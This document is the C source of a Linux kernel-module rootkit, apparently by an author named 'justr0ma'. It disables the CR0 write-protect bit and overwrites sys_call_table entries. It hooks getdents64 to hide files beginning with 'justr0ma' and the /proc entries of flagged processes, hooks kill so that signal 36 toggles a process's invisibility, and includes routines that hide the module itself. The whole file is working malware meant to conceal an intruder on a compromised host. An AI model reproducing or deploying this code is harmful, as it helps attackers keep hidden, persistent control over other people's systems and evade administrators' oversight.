#include <linux/init.h>  
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;

// in this three func just i enable&disable protection to write to a syscall table
unsigned long __force_order;
inline void mywrite_cr0(unsigned long cr0)
{
  asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}
void enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  mywrite_cr0(cr0);
}
void disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  mywrite_cr0(cr0);
}
// just i hook a  sys_calltable
static unsigned long *__syscall_table;
#define KPROBE_LOOKUP 1
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#define PF_INVISIBLE 0x10000000
struct task_struct * find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}
int is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

static t_syscall orig_getdents64;
//here just i overwrite getdents64 to hide any file or dir start with justr0ma
static asmlinkage long hook_getdents64(const struct pt_regs *pt_regs)
{
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents64(pt_regs), err; //original getdesnts64 hold
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret)
	{
		dir = (void *)kdirent + off;
		if ((!proc && (memcmp("justr0ma", dir->d_name, strlen("justr0ma")) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
//here i hide & show the lkm module 
static struct list_head *module_previous;
static short module_hidden = 0;
void module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}
void module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}
//hide process 
asmlinkage int kill_hook(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
	struct task_struct *task;
	if (sig == 36)
	{
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
	}
	return 0;
}
static int just_init(void)  
{
	// system call table-----
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    __syscall_table = (long unsigned int *)kallsyms_lookup_name("sys_call_table");
    //---------------------
	module_hide();
    if (__syscall_table)
    {
				orig_getdents64 = (t_syscall)__syscall_table[__NR_getdents64];
				orig_kill = (t_syscall)__syscall_table[__NR_kill];
      disable_write_protection();
	  		__syscall_table[__NR_getdents64] = (unsigned long) hook_getdents64;
				__syscall_table[__NR_kill] = (unsigned long) kill_hook;
      enable_write_protection();
    }
  module_show();
  return 0;
}
static void just_exit(void)
{
	disable_write_protection();
		__syscall_table[__NR_getdents64] = (unsigned long) orig_getdents64;
		__syscall_table[__NR_kill] = (unsigned long) orig_kill;
  enable_write_protection();
}

module_init(just_init);  
module_exit(just_exit);
MODULE_LICENSE("GPL");  
MODULE_AUTHOR("justr0ma");
MODULE_DESCRIPTION("ba9i makamalch");
